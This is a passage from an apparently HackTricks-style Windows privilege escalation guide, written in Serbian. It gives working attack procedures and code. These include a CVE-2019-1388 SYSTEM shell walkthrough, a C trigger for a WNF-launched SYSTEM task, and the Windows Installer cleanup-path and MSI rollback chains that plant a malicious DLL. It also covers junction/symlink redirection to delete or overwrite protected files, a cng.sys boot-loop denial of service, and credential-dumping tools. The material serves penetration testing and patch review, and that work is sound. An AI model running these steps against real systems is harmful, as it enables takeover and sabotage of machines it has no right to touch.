
### **Praćenje komandnih linija u potrazi za lozinkama**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive u komandnoj liniji**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz naloga neprivilegovanog korisnika.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nije potrebno ništa instalirati, a binarnu datoteku koja se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se iskoristila ova ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i direktorijuma za otpremanje unutar direktorijuma koji se poslužuje

Aplikacija može da kreira predvidljiv poddirektorijum za otpremanje, upiše u njega ime datoteke koje je dostavio pozivalac, a zatim obradi datoteku. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisa sa strane servera, upis može preko junction-a da završi u direktorijumu koji se poslužuje preko veba. Skripta postavljena tamo može da se izvrši kao identitet veb-servisa ako server izvršava tu vrstu datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za upis ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačan način sastavljanja putanje i redosled događaja u obrađivaču otpremanja, efektivna prava korisnika za brisanje i kreiranje poddirektorijuma, efektivne ACL dozvole odredišta, da li proces koji vrši upis prati reparse points i da li veb-server izvršava datoteke u tom odredištu. Zasebno utvrdite identitete procesa koji vrši upis i veb-servera. Pasivna inventarizacija može da prikaže ACL dozvole direktorijuma i reparse metapodatke, ali ne može da utvrdi ponašanje obrađivača niti buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisnog naloga, pregledajte **stvarni token procesa** pre nego što razmotrite zasebnu putanju eskalacije privilegija tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto preko WNF-a

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izloži okidač dostupan korisniku bez privilegija. Prilikom provere privilegovanog zadatka, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako trenutno stanje koje može da se obezbedi dozvoljava trenutnom korisniku da objavi ažuriranje, korisnik može indirektno da pokrene zadatak pod konfigurisanim identitetom, uprkos postavci `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` pokretao se kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim pregledao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobajtno ime stanja i uporedite status povratka sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća skraćena proba koristi niz bajtova iz primera Recall zadatka; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisna primitiva nije samo okidač, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca izabrana pomoću džoker-znakova, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` jaki su pokazatelji da će se prethodno proverena putanja kasnije rekurzivno obilaziti. Ako se potomci ne otvaraju relativno u odnosu na pouzdane ručke direktorijuma i ne proveravaju pre brisanja, napadač može da promeni razrešavanje putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction i zamenom simboličke veze Object Manager-a](#from-folder-contents-delete-to-system-eop) opisanom ispod: oplock pauzira proces čišćenja nakon što izabere legitimno dete, dok se upisivi predak zamenjuje tako da se, kada se privilegovano brisanje nastavi, putanja razreši preko `\RPC Control` do zaštićene mete. U Recall lancu, ovo je omogućilo SYSTEM brisanje direktorijuma `C:\Config.Msi`, što je bilo potrebno za dokumentovanu tehniku MSI rollback-a.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze površne ispravke reparse tačaka

Provera samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanji. Ostavite te proverene objekte legitimnim, a zamenu junction/oplock premestite u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju stići do neproverenog potomka i pratiti njegovu novu metu. CVE-2026-20941 nastao je upravo zbog ove vrste nepotpune ispravke, nakon što je prva Recall zakrpa proveravala `UKP` i direktorijum sa GUID nazivom, ali je zadržala staru operaciju rekurzivnog brisanja.<sup>[[43]](#references)</sup>

Bezbedan obrazac je da se **svaki potomak** otvori relativno u odnosu na već pouzdanu ručku direktorijuma, pribavi i proveri konačna razrešena putanja/objekat i primeni oznaka za brisanje na tu proverenu ručku. Nemojte proveriti prefiks, a zatim se vratiti rekurzivnom brisanju zasnovanom na putanji. Tokom pregleda zakrpe proverite i strukture na stvarnom mestu poziva: u ovom slučaju, ispitivanje tokom izvršavanja strukture `OBJECT_ATTRIBUTES` pri pozivu `NtCreateFile` pokazalo je da je `RootDirectory` različit od null i da je naziv relativan: `{GUID}\\secure_file.lock`. Time je opovrgnut obmanjujući izlaz dekompilatora koji je ukazivao na drugu primitivu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od proizvoljnog brisanja/pomeranja/preimenovanja direktorijuma do SYSTEM EoP

Tehnika je opisana [**u ovoj objavi na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), a kod za eksploataciju je [**dostupan ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe Windows Installer rollback funkcije kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač mora da napravi **zlonamerni MSI instalacioni paket** koji će se upotrebiti za preuzimanje kontrole nad direktorijumom `C:\Config.Msi`. Windows Installer će taj direktorijum kasnije koristiti za skladištenje rollback datoteka tokom deinstalacije drugih MSI paketa, a te rollback datoteke biće izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje u Windows Installer COM (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM servisu `msiexec.exe` preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverznim inženjeringom utvrđeno je da su relevantni pozivi `IMsiServer` metode `MsiBeginTransactionW` na pomeraju vtable-a `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i pomeraji utvrđeni su reverznim inženjeringom i mogu da se razlikuju između verzija.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` oponaša identitet pozivaoca samo dok otvara prosleđenu putanju sa zastavicama `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se potvrđuje da pozivalac može da obriše direktorijum i sprečava praćenje reparse tačke, ali se **ne** vezuje provereni objekat datoteke za kasnije čišćenje niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao direktorijum, bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` pod `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja pod kontrolom pozivaoca, a podatak `0x00000002` predstavlja zastavicu za direktorijum. `CleanupTempPackages(NULL, FALSE)` zatim neposredno pokreće čišćenje. Njegov radnik sa povišenim privilegijama enumeriše vrednosti registra i prosleđuje stavke direktorijuma rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod poziva i `LockdownPath`, uklanja atribute datoteke i ponavlja pokušaj.<sup>[[41]](#references)</sup>

Minimalni redosled poziva utvrđen u `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisna primitiva je ponovna upotreba putanje, a ne preusmeravanje pomoću junction-a. Registrujte napadački kreiranu putanju `C:\Config.Msi`, uklonite je i sačekajte da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Time se zaobilazi predviđena granica koju obezbeđuju `FILE_FLAG_OPEN_REPARSE_POINT` i mitigacija za poverenje u preusmeravanje, jer nije potrebna reparse tačka.<sup>[[41]](#references)</sup>

Ova primitiva za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` otvorenim pre nego što installer ojača DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nastavka rollback-a.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje napadački kontrolisanu putanju u `TempPackages`. Instalirajte bezbednosna ažuriranja za Windows iz aprila 2025. umesto da uspešan povratak metode koristite kao test zakrpe.<sup>[[41]](#references)[[42]](#references)</sup>

Sažetak tehnike:

1. **Faza 1 – Priprema za hijack (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Kreirajte `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, tako da ga može pokrenuti **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** ka datoteci nakon instalacije.

- Korak 2: Pokrenite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da ih preimenuje u `.rbf` datoteke (rollback rezervne kopije).
    - **Anketirajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu uninstall akciju (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` zapisan.
        - Zatim **čeka** na drugi događaj pre nastavka deinstalacije.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi se deinstalacija završila.
    - Windows Installer ne uspeva da obriše `.rbf` datoteku, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf` datoteku
    - Vi, napadač, ručno brišete `.rbf` datoteku.
    - Sada је **`C:\Config.Msi` празан**, spreman za hijack.

> U ovom trenutku, **aktivirajte ranjivost za brisanje proizvoljnog direktorijuma na nivou SYSTEM** kako biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa dozvolom `WRITE_DAC`.

- Korak 7: Pokrenite još jednu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim postavkama:
        - `TARGETDIR`: lokacija u koju može da se upisuje.
        - `ERROROUT`: promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf` datoteke.

- Korak 8: Pratite pojavu `.rbs` datoteke
    - Koristite `ReadDirectoryChangesW` za praćenje direktorijuma `C:\Config.Msi` dok se ne pojavi nova `.rbs` datoteka.
    - Zabeležite njeno ime datoteke.

- Korak 9: Sinhronizujte se pre rollback-a
    - `.msi` sadrži **prilagođenu install akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs` datoteka.
        - Zatim **čeka** pre nastavka.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa dozvolom `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u direktorijum.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni DLL payload na nivou SYSTEM**.

- Korak 12: Pokrenite rollback
    - Signalizirajte događaj sinhronizacije kako bi installer nastavio.
    - Konfigurisana je **prilagođena akcija tipa 19 (`ErrorOut`)** koja namerno **obara instalaciju** u poznatom trenutku.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdan **automatski povišeni binarni fajl** (npr. `osk.exe`) koji učitava DLL koji ste preuzeli.
    - **Bum**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo direktorijum** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Možete da iskoristite **NTFS interne mehanizme**: svaki direktorijum ima skriveni alternativni tok podataka pod nazivom:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj tok čuva **metapodatke indeksa** fascikle.

Dakle, ako **izbrišete tok `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitiv ne omogućava brisanje proizvoljnih datoteka/fascikli, ali vam **omogućava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu i datoteku-mamac
- Napravite: `C:\temp\folder1`
- Unutar nje napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- **Oplock** **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i prepušta kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok u kojem se čuvaju metapodaci fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobađanje oplock-a
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitivu koja vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **podesite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervnog rešenja** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja datoteka / boot DoS

Kada **privilegovani servis** zapisuje logove/izvoze na putanju pročitanu iz **konfiguracije u koju može da se upisuje**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovano upisivanje pretvorili u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Uslovi**
- Konfiguracija koja sadrži ciljnu putanju može da se menja od strane napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja zapisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca napada**
1. Pročitajte konfiguraciju da biste utvrdili odredište privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis će sada biti izvršen u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu metu (hex/PE parser) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, Windows može prvo pokušati da je učita, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Nova usluga**

Ako već radite u procesu sa High Integrity nivoom, **put do SYSTEM-a** može biti jednostavan: samo **kreirajte i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja service binarne datoteke, proverite da li je validna service datoteka ili da li binarna datoteka dovoljno brzo izvršava potrebne radnje, jer će biti prekinuta za 20s ako nije validna service datoteka.

### AlwaysInstallElevated

Iz procesa sa High Integrity možete pokušati da **omogućite AlwaysInstallElevated unose u registru** i **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o uključenim ključevima registra i o tome kako da instalirate _.msi_ paket potražite ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima High Integrity), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću privilegije SeDebug, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ovom tehnikom se obično **bira bilo koji proces koji se izvršava kao SYSTEM i ima sve privilegije tokena** (_da, možete pronaći SYSTEM procese bez svih privilegija tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Sastoji se od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe service-a za upisivanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **impersonate-uje token** klijenta pipe-a (service-a) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa high integrity na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji **učitava** **proces** koji se izvršava kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija. Štaviše, mnogo ga je **lakše izvesti iz procesa sa high integrity**, jer taj proces ima **dozvole za pisanje** u fascikle koje se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Još pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough u lokalnom okruženju.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na nalozima u domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovno Windows prikupljanje informacija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate ranjivosti za privesc (ZASTARELO, zamenjuje ga Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate ranjivosti za privesc (mora se kompajlirati pomoću VisualStudio) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Istražuje host u potrazi za pogrešnim konfiguracijama (više je alat za prikupljanje informacija nego za privesc) (mora se kompajlirati) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz brojnih softvera (prekompajlirani exe je dostupan na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- C# port PowerUp-a**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani izvršni fajl je dostupan na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz Python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže exploite koji rade (lokalni Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže exploite koji rade (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

